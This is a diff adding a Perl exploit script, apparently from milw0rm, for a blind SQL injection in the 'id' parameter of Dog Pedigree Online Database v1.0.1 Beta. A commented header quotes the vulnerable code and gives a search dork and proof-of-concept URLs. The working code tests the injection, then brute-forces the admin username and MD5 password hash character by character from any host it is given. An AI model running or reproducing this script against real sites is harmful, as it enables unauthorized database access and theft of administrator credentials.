@@ -1,0 +1,270 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
+#** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					¡PROUD TO BE SPANISH!				      **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#----------------------------------------------------------------------------------------------
+#|       	   	     (GET var 'id') BLIND SQL INJECTION EXPLOIT		      	      |
+#|--------------------------------------------------------------------------------------------|
+#|                       |    Dog Pedigree Online Database v1.0.1-Beta     |		      |
+#|  CMS INFORMATION:	  -------------------------------------------------	              |
+#|										              |
+#|-->WEB: http://thewhippetarchives.net/twa_is_offline.php          	                      |
+#|-->DOWNLOAD: http://sourceforge.net/projects/dogarchive          	                      |
+#|-->DEMO: N/A   	     			    					      |
+#|-->CATEGORY: Genealogy								      |
+#|-->DESCRIPTION: This project allows to setup and maintain a database for 	 	      |
+#|		collecting (dog) pedigrees. The data will actually be collected...	      |
+#|-->RELEASED: 2009-01-25								      |
+#|											      |
+#|  CMS VULNERABILITY:									      |
+#|											      |
+#|-->TESTED ON: firefox 3								      |
+#|-->DORK: inurl:"printable_pedigree.php"				                      |
+#|-->CATEGORY: BLIND SQL INJECTION EXPLOIT			                              |
+#|-->AFFECT VERSION: <= 1.0.1 Beta			 			              |
+#|-->Discovered Bug date: 2009-05-08							      |
+#|-->Reported Bug date: 2009-05-08							      |
+#|-->Fixed bug date: 2009-05-12								      |
+#|-->Info patch (v1.0.2): http://sourceforge.net/projects/dogarchive/	 		      |
+#|-->Author: YEnH4ckEr									      |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
+#|-->WEB/BLOG: N/A									      |
+#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
+#----------------------------------------------------------------------------------------------
+#
+#-----------
+#BUG FILES:
+#-----------
+#
+#Path --> [HOME_PATH]/details.php
+#Lines --> 135, 237-239
+#
+#It contents:
+#	...
+#
+#	$currId = $_GET['id'];
+#
+#	...
+#
+#
+#$query = "SELECT dog.creator, users.userId, users.username FROM dog 
+#					 LEFT JOIN users ON dog.creator = users.userId WHERE id=$currId;";
+#$result = mysql_query($query) or die('Query failed: ' . mysql_error());
+#
+#	...
+#	
+#------------
+#CONDITIONS:
+#------------
+#
+#
+#**Exist a valid id
+#
+#**magic quotes=off/on
+#
+#
+#---------------------------------------
+#PROOF OF CONCEPT (BLIND SQL INJECTION):
+#---------------------------------------
+#
+#http://[HOST]/[HOME_PATH]/details.php?id=63174+and+1=1%23  --> True
+#
+#http://[HOST]/[HOME_PATH]/details.php?id=63174+and+1=0%23  --> False
+#
+#
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+#
+#-------------------EOF--INFO------------------------------->>>ENJOY IT!
+#
+use LWP::UserAgent;
+use HTTP::Request;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title Dog Pedigree Online Database v1.0.1-Beta (GET var 'id') BLIND SQL Injection Exploit");
+		system ("color 04");
+	}
+}
+sub request {
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	my $request = HTTP::Request -> new(GET => $_[0]);
+	my $outcode= $userag->request($request)->as_string;
+	return $outcode;
+}
+sub helper {
+	print "\n\t[!-!] Dogarchive v1.0.1 Beta (GET var 'id') BLIND SQL Injection Exploit\n";
+	print "\t[!-!] USAGE MODE: [!-!]\n";
+	print "\t[!-!] perl $0 [HOST] [PATH] [id]\n";
+	print "\t[!-!] [HOST]: Web.\n";
+	print "\t[!-!] [PATH]: Home Path. Not use path= no-path\n";
+	print "\t[!-!] [id]: Valid id.\n";
+	print "\t[!-!] Example: perl $0 'www.example.es' 'dogarchive' '12545'\n"; 
+}
+sub error {
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWEB IS NOT VULNERABLE!\n\n";
+	print "\tMaybe --> \n\n";
+	print "\t1.-Patched\n";
+	print "\t2.-id doesn't exist\n";
+	print "\t3.-it needs to change userId (Default:2252)\n\n";
+	print "\tEXPLOIT FAILED!\n";
+	print "\t-----------------------------------------------------------------\n";
+}
+sub testedblindsql {
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWEB MAYBE BE VULNERABLE!\n\n";
+	print "\tTested Blind SQL Injection.\n";		
+	print "\tStarting exploit...\n"; 
+	print "\t-----------------------------------------------------------------\n\n";
+}
+sub brute_length{
+#User length
+$exit=0;
+$i=0;
+while($exit==0){
+	my $blindsql=$_[0]."+AND+(SELECT+length(username)+FROM+users+WHERE+userId=2252)=".$i++."%23"; #injected code
+	$output=&request($blindsql);
+	if($output =~ (/\<td valign=\"top\"\>\<strong\>Known Offspring: \<\/strong\>\<\/td\>/)){
+		$exit=1;
+	}else{
+		$exit=0;
+	}
+	#Maybe patched. This is the max length of username
+	if($i>100){
+	&error;
+	exit(1);
+	}
+}
+#Save column length
+$length=$i-1;
+print "\t<<<<<--------------------------------------------------------->>>>>\n";
+print "\tLength User catched!\n";
+print "\tLength User: ".$length."\n";
+print "\tBruteforcing User and Password values.\n";
+print "\tWait several minutes (15 o 20 minutes)...\n";
+print "\t<<<<<--------------------------------------------------------->>>>>\n\n";
+return $length;
+}
+sub exploiting {
+#Bruteforcing
+$values="";
+$k=1;
+	$z=48;
+	while(($k<=$_[1]) && ($z<=126)){
+		my $blindsql=$_[0].'+AND+ascii(substring((SELECT+'.$_[2].'+FROM+users+WHERE+userId=2252),'.$k.',1))='.$z.'%23';
+		$output=&request($blindsql);
+		if ($output =~ (/\<td valign=\"top\"\>\<strong\>Known Offspring: \<\/strong\>\<\/td\>/))
+		{
+			$values=$values.chr($z);
+			$k++;
+			$z=47;
+		}
+#new char
+	$z++; 
+	}
+return $values;
+}
+#Main
+&lw;
+	print "\t\t#########################################################\n\n";
+	print "\t\t#########################################################\n\n";
+	print "\t\t##     Dogarchive v1.0.1 Beta - BLIND SQLi Exploit     ##\n\n";
+	print "\t\t##                  Author: Y3nh4ck3r                  ##\n\n";
+	print "\t\t##         Contact:y3nh4ck3r[at]gmail[dot]com          ##\n\n";
+	print "\t\t##                  Proud to be Spanish!               ##\n\n";
+	print "\t\t#########################################################\n\n";
+	print "\t\t#########################################################\n\n";
+#Init variables
+	my $host=$ARGV[0];
+	my $path=$ARGV[1];	
+	my $id=$ARGV[2];
+#Build the uri
+#Build the uri
+	if($path eq "no-path"){
+		$finalhost="http://".$host."/details.php?id=".$id;
+	}else{
+		$finalhost="http://".$host."/".$path."/details.php?id=".$id;
+	}
+#Check all variables needed
+$numArgs = $#ARGV + 1;
+	if($numArgs<=2) 
+	{
+		&helper;
+		exit(1);	
+	}
+$finalrequest = $finalhost;	
+#Testing blind sql injection
+$blindsql=$finalrequest."+AND+1/0%23";
+$output=&request($blindsql);
+if ($output !~ (/\<td valign=\"top\"\>\<strong\>Known Offspring: \<\/strong\>\<\/td\>/))
+{    
+	#blind sql injection is available
+	&testedblindsql;
+}else{ 
+	#Not injectable
+	&error;
+	exit(1); 
+}
+#Bruteforcing length
+$length_user=&brute_length($finalrequest);	
+#Bruteforcing username...
+$username=&exploiting($finalrequest,$length_user,'username');
+#Bruteforcing password...
+$passhash=&exploiting($finalrequest,32,'password');
+#final checking (perhaps admin id is not 2252)
+if((!$username) || (!$passhash)){
+	&error;
+	exit(1);
+}
+print "\n\t\t*************************************************\n";
+print "\t\t*********  EXPLOIT EXECUTED WITH SUCCESS ********\n";
+print "\t\t*************************************************\n\n";
+print "\t\tAdmin-username: ".$username."\n";
+print "\t\tAdmin-password(md5 hash): ".$passhash."\n\n";
+print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
+print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
+print "\t\t<<------------------------EOF---------------------->>\n\n";
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-05-19]
